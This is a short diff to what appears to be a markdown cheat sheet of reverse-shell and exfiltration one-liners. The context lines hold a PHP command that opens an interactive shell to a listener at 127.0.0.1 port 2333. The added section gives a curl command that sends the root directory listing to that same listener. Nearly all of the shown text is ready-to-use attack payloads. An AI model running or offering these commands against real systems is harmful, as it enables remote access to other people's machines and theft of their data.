@@ -43,6 +43,11 @@
 php -r '$sock=fsockopen("127.0.0.1",2333);exec("/bin/sh -i <&3 >&3 2>&3");
 ```
 
+curl
+```bash
+curl http://127.0.0.1:2333/ -d `ls /`;
+```
+
 ## BASH
 
 ```bash
